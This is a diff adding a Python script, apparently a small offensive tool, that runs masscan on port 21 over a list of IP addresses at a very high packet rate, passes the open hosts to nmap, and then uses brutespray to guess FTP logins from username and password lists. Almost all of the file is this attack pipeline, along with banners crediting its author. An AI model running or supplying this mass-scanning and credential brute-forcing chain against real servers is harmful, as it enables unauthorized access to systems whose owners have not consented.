@@ -1,0 +1,89 @@
+#coding:utf-8
+import os
+import time
+try:
+    from urllib.parse import urlparse
+except ImportError:
+    from urlparse import urlparse    
+
+
+splash1 = """
+    +-----------------------------------------------+
+    | Masscan 2 Nmap 2 brutespray Crack             |
+    +-----------------------------------------------+
+    | by Mohammad Elnwajha                       |
+    +-----------------------------------------------+
+"""
+print(splash1)
+
+
+
+os.system('masscan -iL ip.txt -p21 --exclude 255.255.255.255 -oL masscan.txt --rate=1000000')
+while True:
+    if os.path.exists("masscan.txt"):
+        break
+    else:
+        time.sleep(1)
+if os.path.getsize("masscan.txt") == 0:
+    splash3 = """
+    +----------------------------------+
+    | Scan PORTS!          |
+    +----------------------------------+
+    """
+    print(splash3)
+    exit()
+else :
+    splash4 = """
+    +----------------------------------+
+    | Masscan & Nmap   |
+    +----------------------------------+
+    """
+    print(splash4)
+    masscanfile = open("masscan.txt", "r")
+    masscanfile.seek(0)
+    for line in masscanfile:
+        if line.startswith("#"):
+            continue
+        if line.startswith("open"):
+            line = line.split(" ")
+            with open("masscanconvert.txt", "a") as f:
+                f.write(line[3]+"\n")
+                f.close()
+    masscanfile.close()
+if os.path.exists("masscan.txt"):
+    os.system('nmap -vv -iL masscanconvert.txt -p 21 -oX nmap.xml')
+    os.remove("masscan.txt")
+    splash2 = """
+    +----------------------------------+
+    | Nmap is done !                  |
+    +----------------------------------+
+    """
+    print(splash2)
+else:
+    splash5 = """
+    +----------------------------------+
+    | Brute Crack    |
+    +----------------------------------+
+    """
+    print(splash5)
+    exit()
+if os.path.exists("nmap.xml"):
+    os.system('brutespray --file nmap.xml -U user.txt -P pass.txt --service ftp --threads 50 --hosts 250 -c')
+    os.remove("nmap.xml")
+    splash6 = """
+    +----------------------------------+
+    | Brute FTP is done !
+    +----------------------------------+
+    | Thank you , Mohammad Elnwajha             |
+    +----------------------------------+
+    """
+    print(splash6)
+else:
+    splash7 = """
+    +----------------------------------+
+    | Thank you                |
+    +----------------------------------+
+    """
+    print(splash7)
+    exit()
+
